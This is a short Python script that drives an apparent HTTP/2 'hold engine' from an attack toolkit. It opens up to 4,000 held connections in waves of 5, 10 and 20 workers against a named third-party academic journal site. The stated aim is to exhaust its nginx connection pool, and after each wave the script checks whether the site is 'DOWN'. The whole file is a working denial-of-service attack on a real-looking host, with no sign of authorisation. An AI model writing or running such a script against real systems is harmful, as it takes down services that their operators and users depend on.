"""Test hold engine with mass connections to fill nginx pool."""
import sys, time, threading, queue, urllib.request
sys.path.insert(0, '.')
from core.attack.engines.h2_hold_engine import run_hold_worker

target = 'ojs.phb.ac.id'

for workers, conns_per in [(5, 200), (10, 200), (20, 200)]:
    stop = threading.Event()
    q = queue.Queue()
    threads = []
    for wi in range(workers):
        t = threading.Thread(
            target=run_hold_worker,
            kwargs=dict(
                target_url=f'https://{target}/',
                duration=20, worker_id=wi,
                stats_queue=q, stop_event=stop,
                host_header=target, connections=conns_per,
            ),
            daemon=True,
        )
        t.start()
        threads.append(t)
    
    total_target = workers * conns_per
    print(f'\n--- {workers} workers x {conns_per} conns = {total_target} total ---')
    time.sleep(5)
    
    alive_workers = sum(1 for t in threads if t.is_alive())
    print(f'  Workers alive: {alive_workers}/{workers}')
    
    # Drain stats to see active connections
    active_conns = 0
    while True:
        try:
            snap = q.get_nowait()
            if isinstance(snap, dict):
                active_conns = max(active_conns, snap.get('active', 0))
        except queue.Empty:
            break
    
    print(f'  Reported active connections: {active_conns}')
    
    # Test site availability
    try:
        req = urllib.request.Request(f'https://{target}/',
            headers={'User-Agent': 'Mozilla/5.0'},
            method='GET')
        resp = urllib.request.urlopen(req, timeout=5)
        print(f'  Site: {resp.status} (still UP)')
        resp.read()
    except Exception as e:
        print(f'  Site: DOWN! {e}')
    
    stop.set()
    for t in threads:
        t.join(timeout=3)

print('\nDone')
